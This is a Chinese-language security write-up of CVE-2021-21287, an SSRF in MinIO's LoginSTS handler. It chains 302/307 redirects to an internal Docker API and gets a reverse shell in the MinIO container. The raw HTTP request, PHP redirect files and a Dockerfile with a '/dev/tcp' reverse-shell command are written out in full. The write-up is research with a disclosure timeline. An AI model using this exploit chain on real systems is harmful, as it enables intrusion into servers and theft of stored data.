> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/X04IhY9Oau-kDOVbok8wEw)

> “
> 
> 事先声明：本次测试过程完全处于本地或授权环境，仅供学习与参考，不存在未授权测试过程。本文提到的漏洞《MinIO 未授权 SSRF 漏洞（CVE-2021-21287）》已经修复，也请读者勿使用该漏洞进行未授权测试，否则作者不承担任何责任
> 
> ”

随着工作和生活中的一些环境逐渐往云端迁移，对象存储的需求也逐渐多了起来，MinIO 就是一款支持部署在私有云的开源对象存储系统。MinIO 完全兼容 AWS S3 的协议，也支持作为 S3 的网关，所以在全球被广泛使用，在 Github 上已有 25k 星星。

我平时会将一些数据部署在 MinIO 中，在 CI、Dockerfile 等地方进行使用。本周就遇到了一个环境，其中发现一个 MinIO，其大概情况如下：

*   MinIO 运行在一个小型 Docker 集群（swarm）中
    
*   MinIO 开放默认的 9000 端口，外部可以访问，地址为`http://192.168.227.131:9000`，但是不知道账号密码
    
*   `192.168.227.131`这台主机是 CentOS 系统，默认防火墙开启，外部只能访问 9000 端口，dockerd 监听在内网的 2375 端口（其实这也是一个 swarm 管理节点，swarm 监听在 2377 端口）
    

本次测试目标就是窃取 MinIO 中的数据，或者直接拿下。

0x01 MinIO 代码审计
---------------

既然我们选择了从 MinIO 入手，那么先了解一下 MinIO。其实我前面也说了，因为平时用到 MinIO 的时候很多，所以这一步可以省略了。其使用 Go 开发，提供 HTTP 接口，而且还提供了一个前端页面，名为 “MinIO Browser”。当然，前端页面就是一个登陆接口，不知道口令无法登录。

那么从入口点（前端接口）开始对其进行代码审计吧。

在 User-Agent 满足正则`.*Mozilla.*`的情况下，我们即可访问 MinIO 的前端接口，前端接口是一个自己实现的 JsonRPC：

![](https://mmbiz.qpic.cn/mmbiz_png/5AsxricGekWgBGia6X7s9uAOQh3cwuezObW2ftQiaCe2Q7CDicuOZfOla0icDfCPQR3VcFicHLqDHPw2gqUokTcbmJOA/640?wx_fmt=png)

我们感兴趣的就是其鉴权的方法，随便找到一个 RPC 方法，可见其开头调用了`webRequestAuthenticate`，跟进看一下，发现这里用的是 jwt 鉴权：

![](https://mmbiz.qpic.cn/mmbiz_png/5AsxricGekWgBGia6X7s9uAOQh3cwuezObR22Z5DXen7ZuibqXzsJNibJnc4Pd3NZFov9ibZmibce0xOdTfo6JJcic1qA/640?wx_fmt=png)

jwt 常见的攻击方法主要有下面这几种：

*   将 alg 设置为 None，告诉服务器不进行签名校验
    
*   如果 alg 为 RSA，可以尝试修改为 HS256，即告诉服务器使用公钥进行签名的校验
    
*   爆破签名密钥
    

查看 MinIO 的 JWT 模块，发现其中对 alg 进行了校验，只允许以下三种签名方法：

![](https://mmbiz.qpic.cn/mmbiz_png/5AsxricGekWgBGia6X7s9uAOQh3cwuezObyiafuicNBaqyzuCsqoaKpC4HB4XSMMibVAHWHc6I6IKUoiciaDv8Z08e1JA/640?wx_fmt=png)

这就堵死了前两种绕过方法，爆破当然就更别说了，通常仅作为没办法的情况下的手段。当然，MinIO 中使用用户的密码作为签名的密钥，这个其实会让爆破变的简单一些。

鉴权这块没啥突破，我们就可以看看，有哪些 RPC 接口没有进行权限验证。

很快找到了一个接口，`LoginSTS`。这个接口其实是 AWS STS 登录接口的一个代理，用于将发送到 JsonRPC 的请求转变成 STS 的方式转发给本地的 9000 端口（也就还是他自己，因为它是兼容 AWS 协议的）。

简化其代码如下：

```
// LoginSTS - STS user login handler.func (web *webAPIHandlers) LoginSTS(r *http.Request, args *LoginSTSArgs, reply *LoginRep) error { ctx := newWebContext(r, args, "WebLoginSTS") v := url.Values{} v.Set("Action", webIdentity) v.Set("WebIdentityToken", args.Token) v.Set("Version", stsAPIVersion) scheme := "http"    // ... u := &url.URL{  Scheme: scheme,  Host:   r.Host, } u.RawQuery = v.Encode() req, err := http.NewRequest(http.MethodPost, u.String(), nil) // ...}
```

没发现有鉴权上的绕过问题，但是发现了另一个有趣的问题。这里，MinIO 为了将请求转发给 “自己”，就从用户发送的 HTTP 头 Host 中获取到 “自己的地址”，并将其作为 URL 的 Host 构造了新的 URL。

这个过程有什么问题呢？

因为请求头是用户可控的，所以这里可以构造任意的 Host，进而构造一个 SSRF 漏洞。

我们来实际测试一下，向`http://192.168.227.131:9000`发送如下请求，其中 Host 的值是我本地 ncat 开放的端口（`192.168.1.142:4444`）：

```
POST /minio/webrpc HTTP/1.1Host: 192.168.1.142:4444User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36Content-Type: application/jsonContent-Length: 80{"id":1,"jsonrpc":"2.0","params":{"token":  "Test"},"method":"web.LoginSTS"}
```

成功收到请求：

![](https://mmbiz.qpic.cn/mmbiz_png/5AsxricGekWgBGia6X7s9uAOQh3cwuezObF6wEictOEtibJkQosqvw7HPFibFm2B2ynpsF0EMYG2XOhVrXbria4DfqHw/640?wx_fmt=png)

可以确定这里存在一个 SSRF 漏洞了。

0x02 升级 SSRF 漏洞
---------------

仔细观察，可以发现这是一个 POST 请求，但是 Path 和 Body 都没法控制，我们能控制的只有 URL 中的一个参数`WebIdentityToken`。

但是这个参数经过了 URL 编码，无法注入换行符等其他特殊字符。这样就比较鸡肋了，如果仅从现在来看，这个 SSRF 只能用于扫描端口。我们的目标当然不仅限于此。

与 PHP 的`file_get_contents()`和 Python 的`requests.post()`不同，Go 默认的 http 库会跟踪 302 跳转，而且不论是 GET 还是 POST 请求。所以，我们这里可以 302 跳转来 “升级”SSRF 漏洞。

使用 PHP 来简单地构造一个 302 跳转：

```
<?phpheader('Location: http://192.168.1.142:4444/attack?arbitrary=params');
```

将其保存成 index.php，启动一个 PHP 服务器：

![](https://mmbiz.qpic.cn/mmbiz_png/5AsxricGekWgBGia6X7s9uAOQh3cwuezObyxo44WLicJI8DfajEz58DAes49vibT7JSAElicDxganfAXz75hfr4Cjibg/640?wx_fmt=png)

将 Host 指向这个 PHP 服务器。这样，经过一次 302 跳转，我们收获了一个可以控制完整 URL 的 GET 请求：

![](https://mmbiz.qpic.cn/mmbiz_png/5AsxricGekWgBGia6X7s9uAOQh3cwuezObS0Z9ZdEIIFMnJ3kskq5XvbIK9nHRUO35vyn2lcR73Dy5k2IaQ6aVRw/640?wx_fmt=png)

放宽了一些限制，结合前面我对这套内网的了解，我们可以尝试攻击 Docker 集群的 2375 端口。

2375 是 Docker API 的接口，使用 HTTP 协议通信，默认不会监听 TCP 地址，这里可能是为了方便内网其他机器使用所以开放在内网的地址里了。那么，我们是否可以通过 SSRF 来攻击这个接口呢？

在 Docker 未授权访问的情况下，我们通常可以使用`docker run`或`docker exec`来在目标容器里执行任意命令（如果你不了解，可以参考这篇文章）。但是翻阅 Docker 的文档可知，这两个操作的请求是`POST /containers/create`和`POST /containers/{id}/exec`。

两个 API 都是 POST 请求，而我们可以构造的 SSRF 却是一个 GET 的。怎么办呢？

0x03 再次升级 SSRF 漏洞
-----------------

还记得我们是怎样获得这个 GET 型的 SSRF 的吗？通过 302 跳转，而接受第一次跳转的请求就是一个 POST 请求。不过我们没法直接利用这个 POST 请求，因为他的 Path 不可控。

如何构造一个 Path 可控的 POST 请求呢？

我想到了 307 跳转，307 跳转是在 RFC 7231 中定义的一种 HTTP 状态码，描述如下：

> “
> 
> The 307 (Temporary Redirect) status code indicates that the target resource resides temporarily under a different URI and the user agent MUST NOT change the request method if it performs an automatic redirection to that URI.
> 
> ”

307 跳转的特点就是不会改变原始请求的方法，也就是说，在服务端返回 307 状态码的情况下，客户端会按照 Location 指向的地址发送一个相同方法的请求。

我们正好可以利用这个特性，来获得 POST 请求。

简单修改一下之前的 index.php：

```
<?phpheader('Location: http://192.168.1.142:4444/attack?arbitrary=params', false, 307);
```

尝试 SSRF 攻击，收到了预期的请求：

![](https://mmbiz.qpic.cn/mmbiz_png/5AsxricGekWgBGia6X7s9uAOQh3cwuezObfg5UK3IO7iaDAKQy6JB4nkOibLibQRMHQBluiaqbVANnBF7961BN5tXIXg/640?wx_fmt=png)

Bingo，获得了一个 POST 请求的 SSRF，虽然没有 Body。

0x04 攻击 Docker API
------------------

回到 Docker API，我发现现在仍然没法对 run 和 exec 两个 API 做利用，原因是，这两个 API 都需要在请求 Body 中传输 JSON 格式的参数，而我们这里的 SSRF 无法控制 Body。

继续翻阅 Docker 文档，我发现了另一个 API，Build an image：

![](https://mmbiz.qpic.cn/mmbiz_png/5AsxricGekWgBGia6X7s9uAOQh3cwuezObrBib7XUwUlYD0oOV0wBsvK2uBhyUyw6eH2usCicVLzWxrjvnyGtiboxlg/640?wx_fmt=png)

这个 API 的大部分参数是通过 Query Parameters 传输的，我们可以控制。阅读其中的选项，发现它可以接受一个名为`remote`的参数，其说明为：

> “
> 
> A Git repository URI or HTTP/HTTPS context URI. If the URI points to a single text file, the file’s contents are placed into a file called `Dockerfile` and the image is built from that file. If the URI points to a tarball, the file is downloaded by the daemon and the contents therein used as the context for the build. If the URI points to a tarball and the `dockerfile` parameter is also specified, there must be a file with the corresponding path inside the tarball.
> 
> ”

这个参数可以传入一个 Git 地址或者一个 HTTP URL，内容是一个 Dockerfile 或者一个包含了 Dockerfile 的 Git 项目或者一个压缩包。

也就是说，Docker API 支持通过指定远程 URL 的方式来构建镜像，而不需要我在本地写入一个 Dockerfile。

所以，我尝试编写了这样一个 Dockerfile，看看是否能够 build 这个镜像，如果可以，那么我的 4444 端口应该能收到 wget 的请求：

```
FROM alpine:3.13RUN wget -T4 http://192.168.1.142:4444/docker/build
```

然后修改前面的 index.php，指向 Docker 集群的 2375 端口：

```
<?phpheader('Location: http://192.168.227.131:2375/build?remote=http://192.168.1.142:4443/Dockerfile&nocache=true&t=evil:1', false, 307);
```

进行 SSRF 攻击，等待了一会儿，果然收到请求了：

![](https://mmbiz.qpic.cn/mmbiz_png/5AsxricGekWgBGia6X7s9uAOQh3cwuezObPFFlicqia5rztazyXicoCmvD3qiavH9ycAMFFNRrFVePCCJSJnq4AaOtDg/640?wx_fmt=png)

完美，我们已经可以在目标集群容器里执行任意命令了。

0x05 拿下 MinIO 容器
----------------

此时离我们的目标，拿下 MinIO，还差一点点，后面的攻击其实就比较简单了。

因为现在可以执行任意命令，我们就不会再受到 SSRF 漏洞的限制，可以直接反弹一个 shell，或者可以直接发送任意数据包到 Docker API，来访问容器。经过一顿测试，我发现 MinIO 虽然是运行的一个 service，但实际上就只有一个容器。

所以我编写了一个自动化攻击 MinIO 容器的脚本，并将其放在了 Dockerfile 中，让其在 Build 的时候进行攻击，利用`docker exec`在 MinIO 的容器里执行反弹 shell 的命令。这个 Dockerfile 如下：

```
FROM alpine:3.13RUN apk add curl bash jqRUN set -ex && \    { \        echo '#!/bin/bash'; \        echo 'set -ex'; \        echo 'target="http://192.168.227.131:2375"'; \        echo 'jsons=$(curl -s -XGET "${target}/containers/json" | jq -r ".[] | @base64")'; \        echo 'for item in ${jsons[@]}; do'; \        echo '    name=$(echo $item | base64 -d | jq -r ".Image")'; \        echo '    if [[ "$name" == *"minio/minio"* ]]; then'; \        echo '        id=$(echo $item | base64 -d | jq -r ".Id")'; \        echo '        break'; \        echo '    fi'; \        echo 'done'; \        echo 'execid=$(curl -s -X POST "${target}/containers/${id}/exec" -H "Content-Type: application/json" --data-binary "{\"Cmd\": [\"bash\", \"-c\", \"bash -i >& /dev/tcp/192.168.1.142/4444 0>&1\"]}" | jq -r ".Id")'; \        echo 'curl -s -X POST "${target}/exec/${execid}/start" -H "Content-Type: application/json" --data-binary "{}"'; \    } | bash
```

这个脚本所干的事情比较简单，一个是遍历了所有容器，如果发现其镜像的名字中包含`minio/minio`，则认为这个容器就是 MinIO 所在的容器。拿到这个容器的 Id，用 exec 的 API，在其中执行反弹 shell 的命令。

最后成功拿到 MinIO 容器的 shell：

![](https://mmbiz.qpic.cn/mmbiz_png/5AsxricGekWgBGia6X7s9uAOQh3cwuezObxQY4E81zbjb9gHsttZQxxfpO98wvqR5HhRqkDcicNvyJ5w7tszn19Mg/640?wx_fmt=png)

当然，我们也可以通过 Docker API 来获取集群权限，这不在本文的介绍范围内了。

0x06 总结
-------

本次测试开始于一个 MinIO 开放的 9000 端口，通过代码审计，挖掘到了 MinIO 的一个 SSRF 漏洞，又利用这个漏洞攻击内网的 Docker API，最终拿到了 MinIO 的权限。

本文所涉及的漏洞已经提交给 MinIO 官方并修复，以下是时间线：

*   Jan 23, 2021, 9:11 PM - 漏洞提交
    
*   Jan 24, 2021, 3:06 AM - 漏洞确认
    
*   Jan 26, 2021, 2:15 AM - 修复已被合并进主线分支
    
*   Jan 30, 2021, 11:22 AM - 漏洞公告和新版本被发布
    
*   Feb 2, 2021 01:10 AM - 确认编号 - CVE-2021-21287